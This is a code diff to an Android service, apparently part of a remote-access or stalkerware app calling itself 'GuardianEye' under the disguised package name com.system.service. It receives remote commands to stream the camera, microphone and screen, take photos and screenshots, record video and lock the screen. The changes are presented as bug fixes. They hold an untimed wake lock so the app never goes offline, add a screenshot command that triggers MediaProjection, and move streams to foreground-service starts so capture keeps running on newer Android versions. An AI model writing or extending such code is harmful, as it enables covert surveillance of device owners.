@@ -187,7 +187,10 @@ class CoreService : Service() {
             // RESEARCH NOTE (Doze): PARTIAL_WAKE_LOCK prevents CPU sleep.
             // Foreground service + PARTIAL_WAKE_LOCK = survives Doze for our critical work.
             wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GuardianEye::CoreLock")
-                .also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
+                // BUG FIX: Timed acquire (10h) auto-releases after 10 hours → CPU allowed to
+                // sleep → WebSocket dies → app appears "offline" after 10h of uptime.
+                // Untimed acquire holds until explicit release() in onDestroy().
+                .also { it.setReferenceCounted(false); it.acquire() }
         } catch (_: Exception) {}
     }
 
@@ -434,11 +437,31 @@ class CoreService : Service() {
                 "get_full_photo"       -> sendFullPhoto(data.optString("path"))
                 "get_running_app"      -> sendCurrentAppBackground()
 
-                "start_camera_stream"  -> startService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
+                // BUG FIX: take_screenshot command was completely unhandled — silently dropped.
+                // Now starts the screen stream service for one snapshot (uses MediaProjection).
+                "take_screenshot" -> {
+                    if (ScreenStreamService.projectionResultData != null) {
+                        // Projection already granted — start stream, it auto-sends frames
+                        startFgService(Intent(this, ScreenStreamService::class.java).putExtra("interval", 2000L))
+                    } else {
+                        // Need MediaProjection permission first
+                        try {
+                            val i = Intent(this, com.system.service.setup.MediaProjectionActivity::class.java)
+                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                            startActivity(i)
+                        } catch (e: Exception) { CrashLogger.logCrash(this, e, "take_screenshot:noProjection") }
+                    }
+                }
+
+                // BUG FIX: startService() for services that declare foregroundServiceType causes
+                // ForegroundServiceStartNotAllowedException on Android 14+ (API 34+).
+                // Must use startForegroundService() — service must call startForeground() within 5s.
+                // STOP actions still use startService (no foreground needed to send a stop intent).
+                "start_camera_stream"  -> startFgService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
                 "stop_camera_stream"   -> startService(Intent(this, CameraStreamService::class.java).setAction("STOP"))
-                "start_mic_stream"     -> startService(Intent(this, AudioStreamService::class.java))
+                "start_mic_stream"     -> startFgService(Intent(this, AudioStreamService::class.java))
                 "stop_mic_stream"      -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
-                "start_screen_stream"  -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
+                "start_screen_stream"  -> startFgService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                 "stop_screen_stream"   -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))
 
                 "start_camera_record"  -> CameraRecorder.start(this, data.optInt("duration_seconds", 60), data.optBoolean("front_camera", false))
@@ -622,8 +645,23 @@ class CoreService : Service() {
         }
     }
 
+    // BUG FIX: Helper to start foreground services correctly by Android version.
+    // Android 14+ (API 34) requires startForegroundService() for services with foregroundServiceType.
+    // minSdk=26 so no need to check for < O.
+    private fun startFgService(intent: Intent) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+        } catch (e: Exception) {
+            CrashLogger.logCrash(this, e, "startFgService:${intent.component?.shortClassName}")
+        }
+    }
+
     private fun takeSinglePhoto() {
-        try { startService(Intent(this, CameraStreamService::class.java).setAction("SNAPSHOT")) } catch (_: Exception) {}
+        try { startFgService(Intent(this, CameraStreamService::class.java).setAction("SNAPSHOT")) } catch (_: Exception) {}
     }
 
     private fun lockScreen() {
